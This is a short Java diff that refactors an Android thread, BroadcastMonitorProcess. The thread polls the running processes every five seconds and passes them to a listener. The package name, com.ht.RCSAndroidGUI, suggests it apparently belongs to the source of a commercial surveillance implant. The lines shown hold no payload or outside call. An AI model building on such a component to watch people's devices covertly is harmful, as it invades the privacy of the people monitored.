@@ -1,6 +1,10 @@
 package com.ht.RCSAndroidGUI.listener;
 
-import com.ht.RCSAndroidGUI.RunningProcess;
+import java.util.ArrayList;
+
+import android.app.ActivityManager.RunningAppProcessInfo;
+
+import com.ht.RCSAndroidGUI.RunningProcesses;
 
 public class BroadcastMonitorProcess extends Thread {
 	/** The Constant TAG. */
@@ -8,10 +12,14 @@ public class BroadcastMonitorProcess extends Thread {
 
 	private boolean stop;
 	private int period;
+	RunningProcesses runningProcess;
+
+	private ListenerProcess listenerProcess;
 
 	public BroadcastMonitorProcess() {
 		stop = false;
 		period = 5000; // Poll interval
+		runningProcess = new RunningProcesses();
 	}
 
 	synchronized public void run() {
@@ -20,9 +28,8 @@ public class BroadcastMonitorProcess extends Thread {
 				return;
 			}
 
-			RunningProcess p = RunningProcess.self();
-			
-			onReceive(p);
+			runningProcess.update();
+			listenerProcess.dispatch(runningProcess);
 
 			try {
 				wait(period);
@@ -32,12 +39,9 @@ public class BroadcastMonitorProcess extends Thread {
 		} while (true);
 	}
 
-	public void onReceive(RunningProcess p) {	
-		ListenerProcess.self().dispatch(p);
-	}
-
-	void register() {
+	void register(ListenerProcess listenerProcess) {
 		stop = false;
+		this.listenerProcess=listenerProcess;
 	}
 
 	synchronized void unregister() {
